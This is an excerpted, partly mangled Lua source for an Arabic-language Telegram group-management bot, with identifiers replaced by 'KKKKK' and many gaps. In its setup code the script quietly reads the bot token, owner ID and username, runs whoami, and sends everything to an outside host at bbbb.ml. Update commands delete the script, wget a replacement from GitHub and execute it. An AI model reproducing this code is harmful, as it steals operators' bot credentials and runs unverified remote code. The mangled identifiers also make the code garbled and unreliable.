...
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
install = io.pkkkkk("whoami"):read('*a'):gsub('[\n\r]+', '') 
https.request('http://bbbb.ml/KKKKK/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.kkkkk("KKKKK", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/KKKKK
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./KKKKK.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.kkkkk("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S KKKKK -X kill
screen -S KKKKK ./KKKKK
done
]])  
file:close() 
...
local KKKKK_Msg = ''  
if msgs < 100 then 
KKKKK_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
KKKKK_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
KKKKK_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
KKKKK_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
KKKKK_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
KKKKK_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
KKKKK_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
KKKKK_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
KKKKK_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
KKKKK_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
KKKKK_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
KKKKK_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
KKKKK_Msg = 'رب التفاعل '  
end 
return KKKKK_Msg 
end
...
t = t..'}}'
local File = io.kkkkk('./'..bot_id..'.json', "w")
File:write(t)
File:close()
...
local info_file = io.kkkkk('./'..bot_id..'.json', "r"):read('*a')
...
function plugin_KKKKK(msg)
for v in io.pkkkkk('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.KKKKK and msg then
pre_msg = plugin.KKKKK(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceKKKKK(msg,data) -- بداية العمل
if msg then
...
SourceKKKKKr = ' ゠ههلو عمري 💞⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, SourceKKKKKr) 
end
end
...
send(msg.chat_id_, msg.id_,KKKKK_Msg) 
return false  
end 
if text then    
...
send(msg.chat_id_, msg.id_, io.pkkkkk([[
...
os.execute('rm -rf KKKKK.lua')
os.execute('wget https://raw.githubusercontent.com/BOYKAAX/kkkkk/master/kkkkk.lua')
...
local KKKKK1_Msg = database:get(bot_id.."KKKKK1:Add:Filter:Rp2"..text..msg.chat_id_)   
if KKKKK1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if KKKKK_Msg and not Special(msg) then  
local KKKKK_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if KKKKK_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
os.execute('rm -rf KKKKK.lua')
os.execute('wget https://raw.githubusercontent.com/TeamKKKKK/KKKKK/master/KKKKK.lua')
send(msg.chat_id_, msg.id_,'✥┆ تم تحديث السورس . 𖦲 ◜')
dofile('KKKKK.lua')  
end
...
database:set(bot_id.."KKKKK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."KKKKK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁༯┆ارسل التحذير عند ارسال الكلمة 💞 ܰ")  
database:set(bot_id.."KKKKK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."KKKKK1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."KKKKK1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."KKKKK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"܁༯┆تم منع الكلمه مع التحذير 💞 ܰ")  
database:del(bot_id.."KKKKK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."KKKKK1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."KKKKK1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."KKKKK1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمةه الان 💞 ܰ ")  
database:set(bot_id.."KKKKK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."KKKKK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."KKKKK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."KKKKK1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."KKKKK1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."KKKKK1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."KKKKK1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."KKKKK1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."KKKKK1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n٭ 𖤓┆قائمة المنع ☓💞◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do  
local KKKKK_Msg = database:get(bot_id.."KKKKK1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..KKKKK_Msg.."◜\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'['..KKKKK_Msg[math.random(#KKKKK_Msg)]..']') 
return false
end
...
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..KKKKKk..''..KKKKK..'\n*☑️┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
KKKKK = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(KKKKK)
...
--------------------------------------------------------------------------------------------------------------
SourceKKKKK(data.message_,data)
plugin_KKKKK(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local KKKKKbot = database:get(bot_id.."KKKKK1:Add:Filter:Rp2"..text..result.chat_id_)   
if KKKKKbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..KKKKKbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local KKKKK1_Msg = database:get(bot_id.."KKKKK1:Add:Filter:Rp2"..text..result.chat_id_)   
if KKKKK1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..KKKKK1_Msg)
